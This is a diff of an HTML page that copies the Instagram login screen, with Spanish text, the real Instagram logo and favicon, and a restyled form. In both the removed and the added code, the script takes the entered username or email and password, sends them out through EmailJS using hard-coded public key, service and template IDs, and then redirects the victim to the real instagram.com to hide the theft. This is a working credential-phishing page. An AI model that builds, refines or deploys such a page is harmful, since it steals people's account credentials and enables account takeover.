@@ -4,14 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <!-- EmailJS SDK -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-       (function(){
-          emailjs.init("q1IUmbgdFeBvmxnvi"); // <--- IMPORTANTE: Pega aquí tu Public Key de EmailJS
-       })();
-    </script>
-
+    <!-- Icono de Instagram -->
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/1_8g92b6890.png" />
     <style>
         body {
             background-color: #fafafa;
@@ -21,158 +15,164 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            flex-direction: column;
         }
-        .login-container {
+
+        .container {
             background-color: #ffffff;
             border: 1px solid #dbdbdb;
-            padding: 40px;
             width: 350px;
-            text-align: center;
-            box-sizing: border-box;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
+
         .logo {
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
             width: 175px;
-            margin: 0 0 30px 0;
         }
-        h2 {
-            font-size: 16px;
-            color: #8e8e8e;
-            font-weight: 600;
-            margin: 0 0 20px 0;
-        }
-        input {
+
+        form {
             width: 100%;
-            padding: 9px 7px 8px;
-            background: #fafafa;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        input {
+            background-color: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            margin-bottom: 10px;
+            padding: 14px 8px;
             font-size: 12px;
+            width: 100%;
             box-sizing: border-box;
         }
+
         input:focus {
-            border-color: #aaa;
             outline: none;
+            border: 1px solid #a8a8a8;
         }
+
         button {
-            width: 100%;
             background-color: #0095f6;
             border: none;
-            color: #fff;
-            padding: 7px;
             border-radius: 4px;
+            color: #ffffff;
             font-weight: 600;
+            padding: 8px;
+            font-size: 14px;
             cursor: pointer;
             margin-top: 10px;
-            position: relative;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
+
         button:hover {
             background-color: #1877f2;
         }
+
         button:disabled {
-            background-color: #bdedef;
-            color: white;
+            background-color: #aecfffaa; /* Un poco azul pero apagado */
             cursor: default;
         }
+
         .spinner {
+            display: none;
             border: 2px solid #f3f3f3;
             border-top: 2px solid #0095f6;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 2s linear infinite;
-            display: none;
-            margin: 0 auto;
-            position: absolute;
-            left: 50%;
-            top: 50%;
-            margin-left: -10px;
-            margin-top: -10px;
+            width: 14px;
+            height: 14px;
+            animation: spin 1s linear infinite;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        .links {
-            margin-top: 15px;
-            font-size: 12px;
-        }
-        .links a {
-            color: #003768;
-            text-decoration: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <!-- LOGO CORREGIDO (URL estable) -->
-        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram" class="logo">
-        
-        <h2>Iniciar sesión</h2>
-        
-        <!-- FORMULARIO -->
+    <div class="container">
+        <div class="logo">
+            <!-- Logo oficial de Instagram -->
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram Logo">
+        </div>
+
         <form id="login-form">
-            <!-- Campo usuario -->
-            <input type="text" name="user_email" id="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
-            
-            <!-- Campo contraseña con autocomplete nuevo para evitar sugerencias de Google -->
-            <input type="password" name="password" id="password" placeholder="Contraseña" autocomplete="new-password" required>
+            <input type="text" id="user_email" name="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+            <input type="password" id="password" name="password" placeholder="Contraseña" required>
             
             <button type="submit" id="submit-btn">
                 <span id="btn-text">Iniciar sesión</span>
                 <div class="spinner" id="spinner"></div>
             </button>
         </form>
-
-        <div class="links">
-            <a href="#">¿Has olvidado la contraseña?</a>
-        </div>
     </div>
 
-    <script>
-        document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            var btn = document.getElementById('submit-btn');
-            var spinner = document.getElementById('spinner');
-            var btnText = document.getElementById('btn-text');
-            
-            // UI Loading
-            btn.disabled = true;
-            btnText.style.opacity = '0';
-            spinner.style.display = "block";
-            
-            // Datos a enviar
-            var templateParams = {
-                user_email: document.getElementById('user_email').value,
-                password: document.getElementById('password').value,
-                // Opcional: fecha y hora
-                time: new Date().toLocaleString() 
-            };
+    <!-- Script de EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            // Tu clave pública
+            emailjs.init("q1IUmbgdFeBvmxnvi");
+        })();
 
-            // EmailJS Send
-            emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", templateParams)
-                .then(function() {
-                    // Éxito
-                    spinner.style.display = "none";
-                    btnText.style.opacity = '1';
-                    btn.style.backgroundColor = "#4CAF50"; // Verde éxito
-                    btnText.innerText = "¡Éxito!";
-                    
-                    setTimeout(function() {
-                        window.location.href = "https://www.instagram.com";
-                    }, 1000); 
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('login-form');
+            const btn = document.getElementById('submit-btn');
+            const btnText = document.getElementById('btn-text');
+            const spinner = document.getElementById('spinner');
 
-                }, function(error) {
-                    // Error
-                    spinner.style.display = "none";
-                    btn.disabled = false;
-                    btnText.style.opacity = '1';
-                    btnText.innerText = "Iniciar sesión";
-                    // Descomenta la línea de abajo si quieres ver el error en la consola
-                    // console.log('Error:', error);
-                });
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // Evita que la página se recargue
+
+                // UI: Mostrar carga
+                btn.disabled = true;
+                btnText.style.display = 'none';
+                spinner.style.display = 'block';
+
+                // Parámetros para enviar
+                const templateParams = {
+                    user_email: document.getElementById('user_email').value,
+                    password: document.getElementById('password').value,
+                    // Opcional: Añadir fecha y hora
+                    fecha: new Date().toLocaleString()
+                };
+
+                // Envío con EmailJS
+                // Tus IDs: Service -> service_rkpt26i, Template -> template_zl3ywbm
+                emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", this)
+                    .then(function(response) {
+                        console.log('Éxito!', response.status, response.text);
+                        // Restaurar botón (opcional)
+                        btnText.style.display = 'block';
+                        spinner.style.display = 'none';
+                        btnText.innerText = "Éxito";
+                        btn.style.backgroundColor = "#4CAF50"; // Verde
+                        
+                        // Redirigir a Instagram real después de 1 segundo
+                        setTimeout(function(){
+                            window.location.href = "https://www.instagram.com";
+                        }, 1000);
+
+                    }, function(error) {
+                        console.error('Fallo...', error);
+                        // Restaurar botón en caso de error
+                        btnText.style.display = 'block';
+                        spinner.style.display = 'none';
+                        btn.disabled = false;
+                        btnText.innerText = "Error";
+                    });
+            });
         });
     </script>
 </body>
